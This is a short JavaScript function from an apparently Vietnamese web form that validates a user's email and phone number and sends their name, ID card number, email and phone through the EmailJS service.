function SendMail() {
    var params = {
        hoten : document.getElementById("ht").value,
        cmnd : document.getElementById("cmnd").value,
        email : document.getElementById("email").value,
        sdt : document.getElementById("sdt").value
    }

    var email = /[A-Z0-9._%+-]+@[A-Z0-9-]+.+.[A-Z]{2,4}/igm;
    var phone = /^\+?\d{1,3}?[- .]?\(?(?:\d{2,3})\)?[- .]?\d\d\d[- .]?\d\d\d\d$/;
    if (email.test(params.email) && phone.test(params.sdt)) {
        emailjs.send('service_nganhangvutru', 'template_k5wondi', params)
        .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        }, function(error) {
        console.log('FAILED...', error);
        });
    }
}